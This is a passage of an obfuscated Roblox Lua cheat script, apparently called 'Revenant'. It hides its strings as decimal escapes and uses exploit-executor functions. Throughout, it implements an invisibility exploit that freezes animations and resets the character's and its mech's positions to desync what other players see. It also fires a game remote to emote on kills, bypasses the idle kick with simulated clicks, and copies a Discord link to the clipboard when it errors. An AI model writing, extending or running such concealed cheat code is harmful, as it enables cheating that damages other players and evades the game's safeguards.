 , }, Unload = { Title = "\085\110\108\111\097\100", Variant = "\068\101\115\116\114\117\099\116\105\118\101", Order = 0x2, Callback = function () task.defer(_IllIlIIlII) end
 , }, }, }) end
 }) getgenv().RevenantCleanup = _IllIlIIlII _lllIllllIl:SetLibrary(_IIIllIIlll) _IlIllIIIlI:SetLibrary(_IIIllIIlll) local _IlllIIIIIl = _llIlIIlIll.DisplayName ~= "" and _llIlIIlIll.DisplayName or _llIlIIlIll.Name _IlIllIIIlI:IgnoreThemeSettings() _lllIllllIl:SetFolder("\090\075\065\089\084\083\066") _IlIllIIIlI:SetFolder("\090\075\065\089\084\083\066\047\084\083\066\047\099\111\110\102\105\103\115") _IlIllIIIlI:BuildConfigSection(_lIIIlIIIlI.Settings) _lllIllllIl:ApplyToTab(_lIIIlIIIlI.Settings) do local _llIlIlIlIl = nil local function _IlIlIlIlII() local _IIllIIlllI = _llIlIIlIll.Character if _IIllIIlllI and _IIllIIlllI.Parent then local _llIIlIIIll = _IIllIIlllI:FindFirstChild("\067\111\109\109\117\110\105\099\097\116\101") if _llIIlIIIll then pcall( function () _llIIlIIIll:FireServer({["\071\111\097\108"] = "\069\109\111\116\101\032\083\112\105\110"}) end
 ) end
 end
 end
 local function _lIIIIlIIIl() if _llIlIlIlIl then _llIlIlIlIl:Disconnect() _llIlIlIlIl = nil end
 local _llllllllII, kills = pcall( function () return game:GetService("\080\108\097\121\101\114\115").LocalPlayer.leaderstats["\084\111\116\097\108\032\075\105\108\108\115"] end
 ) if _llllllllII and kills then _llIlIlIlIl = kills:GetPropertyChangedSignal("\086\097\108\117\101"):Connect( function () _IlIlIlIlII() end
 ) end
 end
 _lIIIIlIIIl() task.spawn( function () local _IIllIIlllI = _llIlIIlIll.Character or _llIlIIlIll.CharacterAdded:Wait() _IIllIIlllI:WaitForChild("\067\111\109\109\117\110\105\099\097\116\101", 0xA) _IlIlIlIlII() end
 ) _llIlIIlIll.CharacterAdded:Connect( function () task.wait(0x1) _lIIIIlIIIl() end
 ) table.insert(_IllIllIIll, function () if _llIlIlIlIl then _llIlIlIlIl:Disconnect() _llIlIlIlIl = nil end
 end
 ) end
 do local _IlIllIIllI = nil local _lllIlIIIII = nil local _lIIllllIlI = RunService.RenderStepped:Connect( function () if _IIIllIIlll.Unloaded then return end
 if not _llIIllIlll.TogHandOffset or not _llIIllIlll.TogHandOffset.Value then return end
 local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 local _IIIlllIIlI = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IIIlllIIlI then return end
 local _IIlIIIIIIl = _IIIlllIIlI:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIlIIIIIIl then return end
 if _lllIlIIIII ~= _IIIlllIIlI then if _IlIllIIllI then pcall( function () if _IlIllIIllI.IsPlaying then _IlIllIIllI:Stop() end
 end
 ) _IlIllIIllI = nil end
 _lllIlIIIII = _IIIlllIIlI end
 if not _IlIllIIllI or _IlIllIIllI.Parent == nil then local _lllIllIlII = Instance.new("\065\110\105\109\097\116\105\111\110") _lllIllIlII.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\049\048\056\049\052\050\048\051\052\052\050\048\052" _IlIllIIllI = _IIlIIIIIIl:LoadAnimation(_lllIllIlII) _IlIllIIllI.Priority = Enum.AnimationPriority.Action4 end
 _IlIllIIllI:Play() _IlIllIIllI.TimePosition = 0.70 _IlIllIIllI:AdjustSpeed(0x0) _IlIllIIllI:AdjustWeight(2e9) RunService.RenderStepped:Wait() if _IlIllIIllI and _IlIllIIllI.IsPlaying then pcall( function () _IlIllIIllI:Stop() end
 ) end
 end
 ) table.insert(_IllIllIIll, function () if _lIIllllIlI then _lIIllllIlI:Disconnect() _lIIllllIlI = nil end
 if _IlIllIIllI and _IlIllIIllI.IsPlaying then pcall( function () _IlIllIIllI:Stop() end
 ) end
 _IlIllIIllI = nil pcall( function () if _llIIllIlll.TogHandOffset then _llIIllIlll.TogHandOffset:SetValue(false) end
 end
 ) end
 ) end
 local function _IllIllIIll(_llIlIllIll) local _IIIIllllIl = false local _llllllIIlI = nil local _IIIIIlllII = nil local _lIIIlllIll = nil local _lIIIIIIIll = nil local _IIIllIIIII = nil local function _IIlllIlllI(_lIlIIllIII) if _llllllIIlI then _llllllIIlI:Disconnect() _llllllIIlI = nil end
 _IIIIIlllII = _lIlIIllIII if not _lIlIIllIII then return end
 _llllllIIlI = _lIlIIllIII.AnimationPlayed:Connect( function (_IlIlIlIlIl) local _IlIIIllllI = _IlIlIlIlIl.Animation and _IlIlIlIlIl.Animation.AnimationId or "" if not getgenv().InvisActive then return end
 if _llIlIllIll.mechGuard and getgenv().MechInvisHandled then pcall( function () _IlIlIlIlIl:Stop() end
 ) return end
 if not _IlIIIllllI:find(_llIlIllIll.animId, 0x1, true) then return end
 if not _IIIIllllIl then _IIIIllllIl = true if _llIlIllIll.onFire then pcall(_llIlIllIll.onFire) end
 task.spawn( function () local _IlIlIllIll = _llIlIIlIll.Character local _IIIlIIIIIl = _IlIlIllIll and _IlIlIllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IIIlIIIIIl then _IIIIllllIl = false return end
 if _llIlIllIll.guardCheck and not _llIlIllIll.guardCheck(_IlIlIllIll) then _IIIIllllIl = false return end
 local _lIIIIIlllI = nil if _lIIIIIIIll then _lIIIIIIIll:Disconnect() _lIIIIIIIll = nil end
 _lIIIIIIIll = RunService.RenderStepped:Connect( function () if _IIIllIIlll.Unloaded or not _IlIlIlIlIl.IsPlaying then if _lIIIIIIIll then _lIIIIIIIll:Disconnect() _lIIIIIIIll = nil end
 return end
 if _lIIIIIlllI then return end
 local _IIlIIIlIll = _IlIlIlIlIl.Length if _IIlIIIlIll > 0x0 and (_IIlIIIlIll - _IlIlIlIlIl.TimePosition) <= 1.50 then local _lIlllllIll = _llIlIIlIll.Character local _IlllIIlIlI = _lIlllllIll and _lIlllllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IlllIIlIlI then _lIIIIIlllI = _IlllIIlIlI.CFrame local _lIIlIIlllI = _lIIIIIlllI.Position end
 if _lIIIIIIIll then _lIIIIIIIll:Disconnect() _lIIIIIIIll = nil end
 end
 end
 ) _IlIlIlIlIl.Stopped:Wait() if _lIIIIIIIll then _lIIIIIIIll:Disconnect() _lIIIIIIIll = nil end
 if not _lIIIIIlllI then local _lIlllllIll = _llIlIIlIll.Character local _IlllIIlIlI = _lIlllllIll and _lIlllllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") _lIIIIIlllI = _IlllIIlIlI and _IlllIIlIlI.CFrame end
 if _lIIIIIlllI then local _llIlIIlIII = 0x0 if _IIIllIIIII then _IIIllIIIII:Disconnect() _IIIllIIIII = nil end
 _IIIllIIIII = RunService.Heartbeat:Connect( function (dt) if _IIIllIIlll.Unloaded then if _IIIllIIIII then _IIIllIIIII:Disconnect() _IIIllIIIII = nil end
 _IIIIllllIl = false return end
 local _lIlllllIll = _llIlIIlIll.Character local _IlllIIlIlI = _lIlllllIll and _lIlllllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IlllIIlIlI then if _IIIllIIIII then _IIIllIIIII:Disconnect() _IIIllIIIII = nil end
 _IIIIllllIl = false return end
 pcall( function () _IlllIIlIlI.CFrame = _lIIIIIlllI end
 ) _llIlIIlIII += dt if _llIlIIlIII >= 0.4 then if _IIIllIIIII then _IIIllIIIII:Disconnect() _IIIllIIIII = nil end
 _IIIIllllIl = false end
 end
 ) else _IIIIllllIl = false end
 end
 ) end
 end
 ) end
 _lIIIlllIll = RunService.Heartbeat:Connect( function () if _IIIllIIlll.Unloaded then return end
 local _IIllIIlllI = _llIlIIlIll.Character local _lIlIIllIII = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIllIII ~= _IIIIIlllII then _IIlllIlllI(_lIlIIllIII) end
 end
 ) table.insert(_IllIllIIll, function () if _lIIIIIIIll then _lIIIIIIIll:Disconnect() _lIIIIIIIll = nil end
 if _llllllIIlI then _llllllIIlI:Disconnect() _llllllIIlI = nil end
 if _lIIIlllIll then _lIIIlllIll:Disconnect() _lIIIlllIll = nil end
 if _IIIllIIIII then _IIIllIIIII:Disconnect() _IIIllIIIII = nil end
 _IIIIllllIl = false _IIIIIlllII = nil end
 ) end
 _IllIllIIll({ _IIIIIIIlII = "\049\052\048\049\053\051\055\050\051\056\052\051\054\052\057", timeThreshold = 0.5, holdAfter = 0.4, }) _IllIllIIll({ _IIIIIIIlII = "\055\055\056\057\049\048\052\049\056\051\057\052\056\051", timeThreshold = 1.0, holdAfter = 0.3, }) _IllIllIIll({ _IIIIIIIlII = "\049\051\051\050\048\055\052\056\057\053\055\052\051\054\052", timeThreshold = 5.0, holdAfter = 0.2, }) do local _IIllIlIllI = nil local _IIllIllIlI = nil local _llllIllllI = nil local _lIlIIlllll = nil local _lllllIIIII = nil local _IIIIIIIIII = nil local _lIIIlIIlIl = nil local _IIlllllIIl = false local _IllllIlIII = nil local _llIIIIIlII = nil local function _IlIIIlIlIl(mech) for _lIIlIllIlI, _IllllllIIl in ipairs(mech:GetDescendants()) do if _IllllllIIl:IsA("\066\097\115\101\080\097\114\116") then pcall( function () _IllllllIIl.Transparency = 0.5 _IllllllIIl.LocalTransparencyModifier = 0.5 _IllllllIIl.CastShadow = false end
 ) end
 end
 end
 local function _IIlIIIIIII(mech) for _lIIlIllIlI, _IllllllIIl in ipairs(mech:GetDescendants()) do if _IllllllIIl:IsA("\066\097\115\101\080\097\114\116") then pcall( function () _IllllllIIl.Transparency = 0x0 _IllllllIIl.LocalTransparencyModifier = 0x0 _IllllllIIl.CastShadow = true end
 ) end
 end
 end
 local function _IIllIllIIl() if _IIllIllIlI then _IIllIllIlI:Disconnect() _IIllIllIlI = nil end
 if _IIllIlIllI then pcall( function () _IIllIlIllI:Stop() end
 ) _IIllIlIllI = nil end
 getgenv()._mechInvisTrack = nil end
 getgenv()._revenantStopMechTrack = _IIllIllIIl local function _IIlIlIIIII() if _llIIIIIlII then _llIIIIIlII:Disconnect() _llIIIIIlII = nil end
 _IllllIlIII = nil end
 local function _llIlIlIIlI(mech) return mech.PrimaryPart or mech:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or mech:FindFirstChildWhichIsA("\066\097\115\101\080\097\114\116") end
 local function _IIIlllIIll(mech, _lIIllIllll) local _lIllIIIlIl = tick() + (_lIIllIllll or 0x5) while tick() < _lIllIIIlIl do if not mech:IsDescendantOf(workspace) then return nil end
 local _IlllIIIIII = mech:FindFirstChildOfClass("\065\110\105\109\097\116\105\111\110\067\111\110\116\114\111\108\108\101\114") if _IlllIIIIII then local _lllIIllIIl = _IlllIIIIII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if _lllIIllIIl then return _lllIIllIIl end
 end
 task.wait(0.05) end
 return nil end
 local function _llIllIlIll(mech) if not getgenv().InvisActive then getgenv().MechInvisHandled = false return end
 local _lllIIllIIl = _IIIlllIIll(mech, 0x5) if not _lllIIllIIl then getgenv().MechInvisHandled = false return end
 if not mech:IsDescendantOf(workspace) then getgenv().MechInvisHandled = false return end
 if not getgenv().InvisActive then getgenv().MechInvisHandled = false return end
 getgenv().MechInvisHandled = true _IIllIllIIl() _IIlIlIIIII() local _lIlIllIlIl = _llIlIlIIlI(mech) if _lIlIllIlIl then _IllllIlIII = _lIlIllIlIl.CFrame end
 local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\057\056\048\057\051\053\050\057\048\051\049\055\053\056" local _llllllllII, _IlIlIlIlIl = pcall( function () return _lllIIllIIl:LoadAnimation(_IlIllllIlI) end
 ) if not _llllllllII or not _IlIlIlIlIl then getgenv().MechInvisHandled = false _IllllIlIII = nil return end
 _IIllIlIllI = _IlIlIlIlIl _IlIlIlIlIl.Priority = Enum.AnimationPriority.Action4 pcall( function () _IlIlIlIlIl:Play() _IlIlIlIlIl.TimePosition = 0.01 end
 ) RunService.RenderStepped:Wait() pcall( function () _IlIlIlIlIl:Stop() end
 ) _IlIIIlIlIl(mech) local _IlllIIIIII = mech:FindFirstChildOfClass("\065\110\105\109\097\116\105\111\110\067\111\110\116\114\111\108\108\101\114") if _IlllIIIIII then local _IIIllIIIll _IIIllIIIll = _IlllIIIIII.AnimationPlayed:Connect( function (mechTrack) local _IlIIIllllI = mechTrack.Animation and mechTrack.Animation.AnimationId or "" if not _IlIIIllllI:find("\056\053\054\054\050\054\053\054\049\049\051\052\051\052", 0x1, true) then return end
 if _IIIllIIIll then _IIIllIIIll:Disconnect() _IIIllIIIll = nil end
 local _lIlllIIlII local _IlIIIIlIII = false _lIlllIIlII = RunService.RenderStepped:Connect( function () if _IIIllIIlll.Unloaded or not mechTrack.IsPlaying then if _lIlllIIlII then _lIlllIIlII:Disconnect() _lIlllIIlII = nil end
 return end
 if _IlIIIIlIII then return end
 local _IIlIIIlIll = mechTrack.Length if _IIlIIIlIll > 0x0 and (_IIlIIIlIll - mechTrack.TimePosition) <= 1.5 then local _IlllIIlIlI = _llIlIlIIlI(mech) if _IlllIIlIlI then _IllllIlIII = _IlllIIlIlI.CFrame _IlIIIIlIII = true end
 if _lIlllIIlII then _lIlllIIlII:Disconnect() _lIlllIIlII = nil end
 end
 end
 ) mechTrack.Stopped:Wait() if _lIlllIIlII then _lIlllIIlII:Disconnect() _lIlllIIlII = nil end
 if not _IlIIIIlIII then local _IlllIIlIlI = _llIlIlIIlI(mech) if _IlllIIlIlI then _IllllIlIII = _IlllIIlIlI.CFrame end
 end
 if _IllllIlIII then local _IlIIIIIlII = _IllllIlIII _IllllIlIII = nil local _llIllIIIll = 0x0 if _llIIIIIlII then _llIIIIIlII:Disconnect() _llIIIIIlII = nil end
 _llIIIIIlII = RunService.Heartbeat:Connect( function (dt) if _IIIllIIlll.Unloaded then if _llIIIIIlII then _llIIIIIlII:Disconnect() _llIIIIIlII = nil end
 return end
 local _IlllIIlIlI = _llIlIlIIlI(mech) if not _IlllIIlIlI then if _llIIIIIlII then _llIIIIIlII:Disconnect() _llIIIIIlII = nil end
 return end
 pcall( function () _IlllIIlIlI.CFrame = _IlIIIIIlII end
 ) _llIllIIIll += dt if _llIllIIIll >= 0.4 then if _llIIIIIlII then _llIIIIIlII:Disconnect() _llIIIIIlII = nil end
 end
 end
 ) end
 end
 ) end
 if _IIllIllIlI then _IIllIllIlI:Disconnect() _IIllIllIlI = nil end
 _IIllIllIlI = RunService.Heartbeat:Connect( function () if _IIIllIIlll.Unloaded or not getgenv().InvisActive or not mech:IsDescendantOf(workspace) then if _IIllIllIlI then _IIllIllIlI:Disconnect() _IIllIllIlI = nil end
 return end
 _IlIIIlIlIl(mech) end
 ) getgenv()._mechInvisTrack = _IlIlIlIlIl end
 local function _IIllllIIll(mech) _lIIIlIIlIl = mech if _IIIIIIIIII then _IIIIIIIIII:Disconnect() _IIIIIIIIII = nil end
 _IIIIIIIIII = mech.AncestryChanged:Connect( function () if not mech:IsDescendantOf(workspace) then _lIIIlIIlIl = nil getgenv().MechInvisHandled = false _IIllIllIIl() _IIlIlIIIII() if _IIIIIIIIII then _IIIIIIIIII:Disconnect() _IIIIIIIIII = nil end
 end
 end
 ) if getgenv().InvisActive then task.spawn( function () _llIllIlIll(mech) end
 ) end
 end
 local function _IllIlIIlll(_lIllIllIIl) if _lIlIIlllll then _lIlIIlllll:Disconnect() _lIlIIlllll = nil end
 local _llIIlIllII = _lIllIllIIl:FindFirstChild("\077\101\099\104") if _llIIlIllII then task.spawn( function () _IIllllIIll(_llIIlIllII) end
 ) end
 _lIlIIlllll = _lIllIllIIl.ChildAdded:Connect( function (_IIIlIIIlII) if _IIIlIIIlII.Name == "\077\101\099\104" then _IIllllIIll(_IIIlIIIlII) end
 end
 ) end
 local function _lIIlIlIllI() local _IIIlIIllll = workspace:FindFirstChild("\076\105\118\101") or workspace:WaitForChild("\076\105\118\101", 0xA) if not _IIIlIIllll then return end
 local _lIllIllIIl = _IIIlIIllll:FindFirstChild(_llIlIIlIll.Name) if _lIllIllIIl then _IllIlIIlll(_lIllIllIIl) end
 if _lllllIIIII then _lllllIIIII:Disconnect() _lllllIIIII = nil end
 _lllllIIIII = _IIIlIIllll.ChildAdded:Connect( function (_IIIlIIIlII) if _IIIlIIIlII.Name == _llIlIIlIll.Name then _IllIlIIlll(_IIIlIIIlII) end
 end
 ) end
 task.spawn(_lIIlIlIllI) _llllIllllI = RunService.Heartbeat:Connect( function () if _IIIllIIlll.Unloaded then return end
 local _IIlIllIlll = getgenv().InvisActive == true if _IIlIllIlll and _lIIIlIIlIl and _lIIIlIIlIl:IsDescendantOf(workspace) then local _llIIIIllIl = not _IIllIlIllI if _llIIIIllIl and not getgenv()._mechInvisSpawning then getgenv()._mechInvisSpawning = true task.spawn( function () _llIllIlIll(_lIIIlIIlIl) getgenv()._mechInvisSpawning = false end
 ) end
 end
 if _IIlIllIlll == _IIlllllIIl then return end
 _IIlllllIIl = _IIlIllIlll if not _IIlIllIlll then getgenv().MechInvisHandled = false getgenv()._mechInvisSpawning = false if _lIIIlIIlIl then _IIlIIIIIII(_lIIIlIIlIl) end
 _IIllIllIIl() if _IllllIlIII and _lIIIlIIlIl and _lIIIlIIlIl:IsDescendantOf(workspace) then local _IlIIIIIlII = _IllllIlIII _IllllIlIII = nil local _llIllIIIll = 0x0 if _llIIIIIlII then _llIIIIIlII:Disconnect() _llIIIIIlII = nil end
 _llIIIIIlII = RunService.Heartbeat:Connect( function (dt) if _IIIllIIlll.Unloaded then if _llIIIIIlII then _llIIIIIlII:Disconnect() _llIIIIIlII = nil end
 return end
 local _IIIlIIIIIl = _lIIIlIIlIl and _llIlIlIIlI(_lIIIlIIlIl) if not _IIIlIIIIIl then if _llIIIIIlII then _llIIIIIlII:Disconnect() _llIIIIIlII = nil end
 return end
 pcall( function () _IIIlIIIIIl.CFrame = _IlIIIIIlII end
 ) _llIllIIIll += dt if _llIllIIIll >= 0.4 then if _llIIIIIlII then _llIIIIIlII:Disconnect() _llIIIIIlII = nil end
 end
 end
 ) end
 return end
 if _lIIIlIIlIl then task.spawn( function () _llIllIlIll(_lIIIlIIlIl) end
 ) end
 end
 ) table.insert(_IllIllIIll, function () if _llllIllllI then _llllIllllI:Disconnect() _llllIllllI = nil end
 if _lIlIIlllll then _lIlIIlllll:Disconnect() _lIlIIlllll = nil end
 if _lllllIIIII then _lllllIIIII:Disconnect() _lllllIIIII = nil end
 if _IIIIIIIIII then _IIIIIIIIII:Disconnect() _IIIIIIIIII = nil end
 if _IIllIllIlI then _IIllIllIlI:Disconnect() _IIllIllIlI = nil end
 if _llIIIIIlII then _llIIIIIlII:Disconnect() _llIIIIIlII = nil end
 _IIllIllIIl() if _lIIIlIIlIl and _lIIIlIIlIl:IsDescendantOf(workspace) then pcall( function () _IIlIIIIIII(_lIIIlIIlIl) end
 ) end
 getgenv().MechInvisHandled = false getgenv()._mechInvisSpawning = false getgenv()._revenantStopMechTrack = nil _IIlllllIIl = false _lIIIlIIlIl = nil _IllllIlIII = nil end
 ) end
 do local _llllllIIlI = nil local _lIIIlllIll = nil local _lIIIIIIIll = nil local _IIIllIIIII = nil local _IIIIllllIl = false local _IIIIIlllII = nil local function _IIlllIlllI(_lIlIIllIII) if _llllllIIlI then _llllllIIlI:Disconnect() _llllllIIlI = nil end
 _IIIIIlllII = _lIlIIllIII if not _lIlIIllIII then return end
 _llllllIIlI = _lIlIIllIII.AnimationPlayed:Connect( function (_IlIlIlIlIl) local _IlIIIllllI = _IlIlIlIlIl.Animation and _IlIlIlIlIl.Animation.AnimationId or "" if not getgenv().InvisActive then return end
 if not _IlIIIllllI:find("\056\053\054\054\050\054\053\054\049\049\051\052\051\052", 0x1, true) then return end
 if not _IIIIllllIl then _IIIIllllIl = true task.spawn( function () local _IlIlIllIll = _llIlIIlIll.Character local _IIIlIIIIIl = _IlIlIllIll and _IlIlIllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IIIlIIIIIl then _IIIIllllIl = false return end
 local _lIIIIIlllI = nil if _lIIIIIIIll then _lIIIIIIIll:Disconnect() _lIIIIIIIll = nil end
 _lIIIIIIIll = RunService.RenderStepped:Connect( function () if _IIIllIIlll.Unloaded or not _IlIlIlIlIl.IsPlaying then if _lIIIIIIIll then _lIIIIIIIll:Disconnect() _lIIIIIIIll = nil end
 return end
 if _lIIIIIlllI then return end
 local _IIlIIIlIll = _IlIlIlIlIl.Length if _IIlIIIlIll > 0x0 and (_IIlIIIlIll - _IlIlIlIlIl.TimePosition) <= 1.50 then local _lIlllllIll = _llIlIIlIll.Character local _IlllIIlIlI = _lIlllllIll and _lIlllllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IlllIIlIlI then _lIIIIIlllI = _IlllIIlIlI.CFrame local _lIIlIIlllI = _lIIIIIlllI.Position end
 if _lIIIIIIIll then _lIIIIIIIll:Disconnect() _lIIIIIIIll = nil end
 end
 end
 ) _IlIlIlIlIl.Stopped:Wait() if _lIIIIIIIll then _lIIIIIIIll:Disconnect() _lIIIIIIIll = nil end
 if not _lIIIIIlllI then local _lIlllllIll = _llIlIIlIll.Character local _IlllIIlIlI = _lIlllllIll and _lIlllllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") _lIIIIIlllI = _IlllIIlIlI and _IlllIIlIlI.CFrame end
 if _lIIIIIlllI then local _llIlIIlIII = 0x0 if _IIIllIIIII then _IIIllIIIII:Disconnect() _IIIllIIIII = nil end
 _IIIllIIIII = RunService.Heartbeat:Connect( function (dt) if _IIIllIIlll.Unloaded then if _IIIllIIIII then _IIIllIIIII:Disconnect() _IIIllIIIII = nil end
 _IIIIllllIl = false return end
 local _lIlllllIll = _llIlIIlIll.Character local _IlllIIlIlI = _lIlllllIll and _lIlllllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IlllIIlIlI then if _IIIllIIIII then _IIIllIIIII:Disconnect() _IIIllIIIII = nil end
 _IIIIllllIl = false return end
 pcall( function () _IlllIIlIlI.CFrame = _lIIIIIlllI end
 ) _llIlIIlIII += dt if _llIlIIlIII >= 0.4 then if _IIIllIIIII then _IIIllIIIII:Disconnect() _IIIllIIIII = nil end
 _IIIIllllIl = false end
 end
 ) else _IIIIllllIl = false end
 end
 ) end
 end
 ) end
 _lIIIlllIll = RunService.Heartbeat:Connect( function () if _IIIllIIlll.Unloaded then return end
 local _IIllIIlllI = _llIlIIlIll.Character local _lIlIIllIII = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIllIII ~= _IIIIIlllII then _IIlllIlllI(_lIlIIllIII) end
 end
 ) table.insert(_IllIllIIll, function () if _lIIIIIIIll then _lIIIIIIIll:Disconnect() _lIIIIIIIll = nil end
 if _llllllIIlI then _llllllIIlI:Disconnect() _llllllIIlI = nil end
 if _lIIIlllIll then _lIIIlllIll:Disconnect() _lIIIlllIll = nil end
 if _IIIllIIIII then _IIIllIIIII:Disconnect() _IIIllIIIII = nil end
 _IIIIllllIl = false _IIIIIlllII = nil end
 ) end
 pcall( function () local _IIIIIIlIll = game:GetService("\086\105\114\116\117\097\108\085\115\101\114") _llIlIIlIll.Idled:Connect( function () _IIIIIIlIll:CaptureController() _IIIIIIlIll:ClickButton2(Vector2.new()) end
 ) end
 ) end
 , tostring) if not _IlIlIIllll then warn("\091\083\111\109\101\116\104\105\110\103\032\105\115\032\119\114\111\110\103\032\119\105\116\104\032\082\101\118\101\110\097\110\116\093\058\032" .. tostring(_mainErr)) print("\091\090\075\065\089\084\083\066\032\069\082\082\079\082\032\068\069\084\065\073\076\093\058\032" .. tostring(_mainErr)) pcall( function () local _lIIlIllIIl = Instance.new("\066\105\110\100\097\098\108\101\070\117\110\099\116\105\111\110") _lIIlIllIIl.Parent = game:GetService("\067\111\114\101\071\117\105") _lIIlIllIIl.OnInvoke = function (choice) if choice == "\117\110\108\111\097\100" then if getgenv().RevenantCleanup then pcall(getgenv().RevenantCleanup) else pcall( function () _IIIllIIlll:Unload() end
 ) end
 getgenv().RevenantLoaded = false pcall( function () setclipboard("\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\103\103\047\084\089\100\083\077\109\081\097\070\057") end
 ) task.delay(0.1, function () pcall( function () game:GetService("\083\116\097\114\116\101\114\071\117\105"):SetCore("\083\101\110\100\078\111\116\105\102\105\099\097\116\105\111\110", { Title = "\082\101\118\101\110\097\110\116", Text = "\068\105\115\099\111\114\100\032\108\105\110\107\032\099\111\112\105\101\100\032\116\111\032\099\108\105\112\098\111\097\114\100\046\032\080\108\101\097\115\101\032\114\101\112\111\114\116\032\116\104\105\115\032\105\115\115\117\101\046", _IlllIlIllI = 0x6, }) end
 ) end
 ) end
 end
 end
 ) end
 end
 ) end
 )(...)
